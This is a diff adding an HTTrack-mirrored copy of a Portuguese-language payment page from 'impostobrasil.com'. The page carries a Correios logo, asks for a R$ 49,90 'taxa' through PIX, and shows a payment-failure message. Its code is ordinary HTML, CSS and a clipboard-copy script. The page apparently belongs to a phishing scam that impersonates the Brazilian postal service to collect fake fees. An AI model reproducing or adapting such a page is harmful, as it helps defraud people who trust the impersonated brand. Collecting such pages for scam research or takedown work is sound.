@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Mirrored from impostobrasil.com/pagamento.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 01 Feb 2025 06:18:01 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Finalizar Pagamento</title>
+    <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/bootstrap/4.5.2/css/bootstrap.min.html">
+    <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/inter-font/3.19.0/inter.min.html">
+    <script src="../cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style>
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            font-family: 'Inter', sans-serif;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            padding: 30px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .logo img {
+            max-width: 150px;
+            margin-bottom: -40px;
+        }
+
+        .loading {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #08b81d;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .qr-code {
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .qr-code img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .pix-key {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            word-break: break-all;
+            font-size: 14px;
+            border: 1px solid #dee2e6;
+        }
+
+        .btn-copy {
+            background-color: #08b81d;
+            color: #fff;
+            width: 100%;
+            border: none;
+            border-radius: 5px;
+            padding: 12px 10px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .btn-copy:hover {
+            background-color: #069416;
+        }
+
+        .error {
+            color: #dc3545;
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-radius: 4px;
+            padding: 15px;
+            margin-top: 20px;
+        }
+
+        .reload-button {
+            background-color: #08b81d;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 20px;
+            margin-top: 15px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-weight: 500;
+        }
+
+        .reload-button:hover {
+            background-color: #069416;
+        }
+
+        #support-contact {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #6c757d;
+        }
+
+        .payment-info {
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .payment-info h3 {
+            color: #08b81d;
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="img/logo-1.png" alt="Logo dos Correios">
+        </div>
+        <br><br>
+        <h2>Taxa R$: 49,90</h2>
+        
+                    <div class="error">
+                <p>Falha no processamento do pagamento. Por favor, tente novamente.</p>
+                <button class="reload-button" onclick="window.location.reload()">
+                    Tentar Novamente
+                </button>
+                <div id="support-contact">
+                    Se o problema persistir, entre em contato com o suporte
+                </div>
+            </div>
+            </div>
+
+    <script>
+        async function copyPixKey() {
+            const pixKey = document.querySelector('.pix-key').textContent.trim();
+            try {
+                await navigator.clipboard.writeText(pixKey);
+                alert('Chave PIX copiada com sucesso!');
+            } catch (err) {
+                console.error('Erro ao copiar: ', err);
+                alert('Não foi possível copiar a chave PIX automaticamente. Por favor, copie manualmente.');
+            }
+        }
+
+            </script>
+</body>
+
+<!-- Mirrored from impostobrasil.com/pagamento.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 01 Feb 2025 06:18:02 GMT -->
+</html>
